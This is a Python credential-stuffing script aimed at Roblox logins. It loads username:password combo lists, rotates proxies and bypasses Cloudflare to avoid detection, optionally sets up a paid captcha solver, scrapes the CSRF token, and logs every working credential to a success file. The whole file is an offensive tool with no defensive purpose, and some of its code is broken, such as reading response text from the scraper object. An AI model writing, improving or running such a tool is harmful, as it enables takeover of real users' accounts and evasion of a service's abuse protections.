# https://github.com/VeNoMouS/cloudscraper

import os
import requests
import random
from itertools import cycle
import capsolver
import socks
import string
from bs4 import BeautifulSoup
import cloudscraper
import sys

# User inputs
use_proxy = input("Use proxy? (y/n): ").lower() == 'y'
use_capsolver = input("Use captcha solver? (y/n): ").lower() == 'y'
wordlist_file = input("Enter wordlist file path: ")
if use_proxy:
    proxy_type = input("Enter proxy type (http/socks5): ")
    proxies_file = input("Enter proxies file path: ")
if use_capsolver:
    capsolver.api_key = input("Enter captcha solver API key: ")

# Check if capsolver API key is valid
if use_capsolver:
    try:
        balance = capsolver.balance()
        print(f"Capsolver balance: {balance}")
    except Exception as e:
        print(f"Error checking capsolver API key: {e}")
        use_capsolver = input("Continue without captcha solver? (y/n): ").lower() == 'y'
        if not use_capsolver:
            sys.exit()

# Load the wordlist
with open(wordlist_file) as f:
    lines = f.readlines()

# Remove whitespace characters like `\n` at the end of each line
lines = [x.strip() for x in lines]

# Load the proxies
proxies = []
if use_proxy:
    try:
        with open(proxies_file) as f:
            for line in f:
                proxy = line.strip()
                if proxy_type == 'socks5':
                    parts = proxy.split(':')
                    if len(parts) == 4:
                        host, port, username, password = parts
                        proxy = f'socks5://{username}:{password}@{host}:{port}'
                    elif len(parts) == 2:
                        host, port = parts
                        proxy = f'socks5://{host}:{port}'
                elif proxy_type == 'http':
                    parts = proxy.split(':')
                    if len(parts) == 2:
                        host, port = parts
                        proxy = f'http://{host}:{port}'
                proxies.append(proxy)
        if not proxies:
            print("No proxies found in file")
            use_proxy = input("Continue without proxy? (y/n): ").lower() == 'y'
            if not use_proxy:
                sys.exit()
    except Exception as e:
        print(f"Error loading proxies: {e}")
        use_proxy = input("Continue without proxy? (y/n): ").lower() == 'y'
        if not use_proxy:
            sys.exit()

# Set up the proxy pool to cycle through the proxies
proxy_pool = cycle(proxies)

# Set up cloudscraper
scraper_args = {}
if use_capsolver:
    scraper_args['captcha'] = {
        'provider': 'capsolver',
        'api_key': capsolver.api_key
    }
scraper = cloudscraper.create_scraper()  # Create a cloudscraper instance
# Make an HTTP request to the login page to get the initial cookies

# session = scraper.session()
# session.get("http://www.roblox.com/Login")

getheaders = {
    'referer': 'http://www.roblox.com/',
    'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39'
}

response = cloudscraper.get("http://www.roblox.com/login", headers=getheaders)
soup = BeautifulSoup(response.content, 'html.parser')
xcsrf_token = soup.find('meta', attrs={'name': 'csrf-token'})['data-token']
# Create the success and failure files if they do not exist
if not os.path.isfile("success.txt"):
    with open("success.txt", mode='a') as success_file:
        pass
if not os.path.isfile("failure.txt"):
    with open("failure.txt", mode='a') as failure_file:
        pass

# Initialize a list to keep track of tried username and password combinations
tried_combinations = []

# Loop through the wordlist and attempt to log in with each username/password combination
for line in lines:
    # Split the line into the username and password
    username, password = line.split(":")

    # Check if this combination has already been tried
    if f"{username}:{password}" in tried_combinations:
        print(f"{username}:{password} already tried, skipping...")
        continue

    # Set up the proxy for this request
    if use_proxy:
        proxy = next(proxy_pool, None)
        if proxy is not None:
            proxy_parts = proxy.split(":")
            if len(proxy_parts) == 3:
                proxy_type, proxy_address, proxy_port = proxy_parts
                scraper.proxies.update({
                    "http": f"{proxy_type}://{proxy_address}:{proxy_port}",
                    "https": f"{proxy_type}://{proxy_address}:{proxy_port}"
                })
            elif len(proxy_parts) == 4:
                proxy_type, proxy_address, proxy_port, proxy_auth = proxy_parts
                scraper.proxies.update({
                    "http": f"{proxy_type}://{proxy_auth}@{proxy_address}:{proxy_port}",
                    "https": f"{proxy_type}://{proxy_auth}@{proxy_address}:{proxy_port}"
                })
            else:
                print(f"Invalid proxy format: {proxy}")
                continue
        else:
            scraper.proxies = {}
    # Build the login request data
    data = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
    }

    # Set the headers for the login request, including the X-CSRF-Token and a randomized User-Agent
    # response = session.get("https://www.roblox.com/Login")
    # scraper.raise_for_status()

    # Solve captcha if present
    if use_capsolver:
        # Add code here to solve captcha using the capsolver library and API key
        pass

    # Send the login request
    postheaders = {
    'origin': 'http://www.roblox.com',
    'referer': 'http://www.roblox.com/',
    'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39',
    'x-csrf-token': xcsrf_token
}
    response = scraper.post("http://www.roblox.com/authentication/login", data=data, headers=postheaders)

    # Check if the login was successful
    if "Recommended For You" in scraper.text:
        print(f"Success: {username}:{password}")
        with open("success.txt", mode='a') as success_file:
            success_file.write(f"{username}:{password}\n")
    elif "Incorrect username or password." in scraper.text:
        print(f"Failure: {username}:{password}")
        with open("failure.txt", mode='a') as failure_file:
            failure_file.write(f"{username}:{password}\n")
    else:
        print(f"Unknown: {username}:{password} (Response code: {scraper.status_code})")
        with open("unknown.txt", mode='a') as unknown_file:
            unknown_file.write(f"{username}:{password}\n")

    # Add this combination to the list of tried combinations
    tried_combinations.append(f"{username}:{password}")
